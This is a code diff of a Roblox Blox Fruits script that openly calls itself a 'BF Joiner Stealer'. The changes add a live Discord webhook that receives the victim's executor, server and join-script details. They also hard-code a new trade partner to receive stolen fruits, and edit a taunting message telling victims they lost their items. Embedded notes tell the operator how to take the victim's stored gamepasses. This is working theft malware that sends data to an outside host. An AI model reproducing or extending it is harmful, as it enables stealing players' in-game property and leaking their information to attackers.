@@ -1,4 +1,4 @@
-Webhook = ""
+Webhook = "https://discordapp.com/api/webhooks/1363467805696987136/puUE-9zz3QzAteNP8Gvqk8xTw62ps3Djx30OUnBT1NWKKWVJA-Xq2PpSoa5fXCD-DnbB"
 Usernames = {"", ""}
 Fruits = {"Portal-Portal", "Phoenix-Phoenix", "Yeti-Yeti", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)", "Spirit-Spirit"}
 FruitsToReset = {
@@ -447,6 +447,40 @@ local LocalPlayer = game.Players.LocalPlayer
 local PlayerName = LocalPlayer.Name
 local PlayerUserId = LocalPlayer.UserId
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser")
+
+local function getName(jobId)
+    local assshit = {
+        "Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich",
+        "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold",
+        "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide",
+        "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy",
+        "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"
+    }
+    
+    local pussy = {
+        "TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat",
+        "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense",
+        "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber",
+        "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door",
+        "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark",
+        "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"
+    }
+    
+    local seed = tonumber("0x" .. jobId:gsub("-", ""):sub(1, 7)) or 0
+    local random = Random.new(seed)
+    local first = assshit[random:NextInteger(1, #assshit)]
+    local second = pussy[random:NextInteger(1, #pussy)]
+    local uniqueNumber = string.format("%04d", random:NextInteger(1, 9999))
+    return first .. " " .. second .. " #" .. uniqueNumber
+end
+
+local function getsrv()
+    local jobId = ServerBrowser:InvokeServer("getjob")
+    return jobId and getName(jobId) or "unknown err idk"
+end
+
+print("name:", getsrv()) -- << outprints the name of the server
 local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
 local HttpService = game:GetService("HttpService")
 local isResettingEnabled = true
@@ -592,18 +626,16 @@ local embed = {
         {name = "Sea", value = Sea, inline = true},
         {name = "Executor Info", value = string.format("```\nExecutor: %s\nStealer Version: %s\n```", ExecutorName, GameVersion), inline = false},
         {name = "Server Info", value = string.format("```\nPlayer Count: %d\nServer Time: %s\n```", PlayerCount, ServerTime), inline = false},
-        {name = "Join Server (PC COPY)", value = "```lua\n" .. JoinScript .. "\n```", inline = false},
-        {name = "Join Server (Mobile COPY)", value = JoinScript, inline = false},
-        {name = "Join " .. Sea .. " (PC COPY)", value = "```lua\n" .. (Sea == "Sea 2" and Sea2Script or Sea3Script) .. "\n```", inline = false},
-        {name = "Join " .. Sea .. " (Mobile COPY)", value = (Sea == "Sea 2" and Sea2Script or Sea3Script):gsub("```lua\n", ""):gsub("\n```", ""), inline = false},
+        -- Combined Join Script
+        {name = "Join Server and Sea (PC COPY)", value = string.format("```lua\n%s\nwait(5)\n%s\n```", JoinScript, (Sea == "Sea 2" and Sea2Script or Sea3Script)), inline = false},
+        {name = "Join Server and Sea (Mobile COPY)", value = JoinScript .. "\nwait(5)\n" .. (Sea == "Sea 2" and Sea2Script or Sea3Script):gsub("```lua\n", ""):gsub("\n```", ""), inline = false},
         {name = "NOTES:", value = [[
 1. You can do ?addallitem or ?additem <name> to steal stored gamepasses/perms.
-2. If victim doesn't do any action automatically, you can try doing chat commands. Check them in rua hub channel "Commands for bf joiner"
+2. If victim doesn't do any action automatically, you can try doing chat commands. Check them in Blueshub channel "Commands for bf joiner"
 3. If victim Isn't on the server, it means he left.
 ]], inline = false}
     }
 }
-
 local isMobile = game:GetService("UserInputService").TouchEnabled
 
 local webhookCache = {
@@ -992,7 +1024,7 @@ local function isInTradeWithCorrectPlayer()
         end
     end
 
-    if tradingPartnerName == "XFistorRespawn" then
+    if tradingPartnerName == "xxxvic41" then
         return true
     end
     
@@ -1233,7 +1265,7 @@ local function createDiscordUI()
     Description.Position = UDim2.new(0.05, 0, 0.3, 0)
     Description.BackgroundTransparency = 1
     Description.Font = Enum.Font.Gotham
-    Description.Text = "Hey! You just lost some of your valuable fruits to BlueHub BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! Click the button to copy invite. Before leaving the game to check if your fruits are really gone, I recommend copying discord invite."
+    Description.Text = "Hey! You just lost some of your valuable fruits to BluesHub BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! Click the button to copy invite. Before leaving the game to check if your fruits are really gone, I recommend copying discord invite."
     Description.TextColor3 = Color3.fromRGB(220, 221, 222)
     Description.TextScaled = true
     Description.TextWrapped = true
@@ -1282,7 +1314,7 @@ local function createDiscordUI()
     end)
     
     Button.MouseButton1Click:Connect(function()
-        setclipboard("https://discord.gg/zJKDqRd5")
+        setclipboard("https://discord.gg/")
         Button.Text = "Copied!"
         task.delay(2, function() Button.Text = "Copy Invite" end)
     end)
